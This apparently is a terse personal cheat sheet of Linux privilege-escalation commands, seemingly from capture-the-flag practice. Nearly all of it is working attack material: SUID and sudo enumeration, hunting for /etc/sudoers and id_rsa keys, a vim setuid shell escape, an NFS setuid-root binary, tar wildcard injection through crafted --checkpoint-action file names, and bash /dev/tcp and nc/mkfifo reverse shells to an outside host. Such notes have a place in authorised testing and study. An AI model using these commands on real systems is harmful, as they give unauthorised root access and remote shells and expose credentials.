```
sudo -l
```

View sudo
```
cat /etc/sudoers
```

Find file
```
find . -name "flag2.txt" 2>/dev/null
find / -name "flag4.txt" 2>/dev/null
```

Find suid vulnerable
```
find / -type f -perm -04000 -ls 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm -u=s -type f 2>/dev/null

find / -type f -perm /4000 2>/dev/null

```

- Look in GTFObins under SUID
	[[GTFObins]]

```
getcap -r / ls 2>/dev/null
ls -l /usr/bin/vim
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```
View cronjobs
```
cat /etc/crontab
```

Find SSH key
```
find / -name id_rsa 2> /dev/null
```

reverse shell without nc:
```
bash -i >& /dev/tcp/<ip>/<port>
```

Mount to a Shared directory to your machine
```
showmount -e 10.10.153.74    
sudo mount -o rw 10.10.153.74:/home/backup /tmp/backupsonattachermachine

sudo su to cd to /tmp/

┌──(root㉿kali)-[/tmp/backupsonattachermachine]
└─# cat nfs.c 
int main(){
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
┌──(root㉿kali)-[/tmp/backupsonattachermachine]
└─# gcc nfs.c -o nfs -w
┌──(root㉿kali)-[/tmp/backupsonattachermachine]
└─# chmod +s nfs                     
┌──(root㉿kali)-[/tmp/backupsonattachermachine]
└─# ls -l nfs
```

### Wildcard priv esc
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

Change /bin/bash to suid (if using root)
This will run the program as the owner
```
'#!/bin/bash\nchmod +s /bin/bash' > shell.
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```
```
echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh

echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```


### Set 777 perm recursively
```
chmod -R 777 /root/;
```